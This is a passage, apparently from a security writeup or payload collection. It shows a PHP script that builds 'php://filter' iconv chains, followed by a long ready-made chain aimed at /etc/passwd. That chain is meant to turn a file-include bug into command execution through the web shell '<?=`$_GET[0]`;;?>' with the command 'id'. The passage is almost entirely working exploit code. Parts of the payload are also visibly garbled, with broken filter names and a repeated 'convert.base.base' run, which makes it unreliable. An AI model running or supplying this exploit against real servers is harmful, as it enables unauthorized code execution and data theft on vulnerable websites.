    "V" => "convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB",
    "W" => "convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936",
    "X" => "convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932",
    "Y" => "convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361",
    "Z" => "convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16"
);

$filters = "convert.iconv.UTF8.CSISO2022KR|";
$filters .= "convert.base64-encode|";
$filters .= "convert.iconv.UTF8.UTF7|";

foreach (str_split(strrev($base64_payload)) as $c) {
    $filters .= $conversions[$c] . "|";
    $filters .= "convert.base64-decode|";
    $filters .= "convert.base64-encode|";
    $filters .= "convert.iconv.UTF8.UTF7|";
}
$filters .= "convert.base64-decode";

$final_payload = "php://filter/{$filters}/resource=/etc/passwd";
echo $final_payload;
```

Here is a direct use of `payload`

```
// <?=`$_GET[0]`;;?>

php://filter/convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.IEC_P271.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.I SO2022KR.UTF16|convert.iconv.L7.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.857.SHIFTJISX0213|convert.base64-decode|convert.base64-encode|convert.i
conv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.866.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv .UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L3.T.61|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|conve rt.iconv.SJIS.GBK|convert.iconv.L10.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2|con vert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2|convert.base64-decode|con vert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.CP1256.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|con vert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS 2.UTF8|convert.iconv.851.UTF8|convert.iconv.L7.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.CP1133.IBM932|convert.base64- decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.851.BIG5|convert.base64-decode|convert.base.base.base.base.base. 64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.1046.UCS2|convert.base64-decode|convert.base64-encode|convert .iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|co nvert.iconv.ISO2022KR.UTF16|convert.iconv.L7.SHIFTJISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv .MAC.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CS ISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.JOHAB|con vert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.i conv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|conver t.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.857.SHIFTJISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=/etc/passwd&0=id
```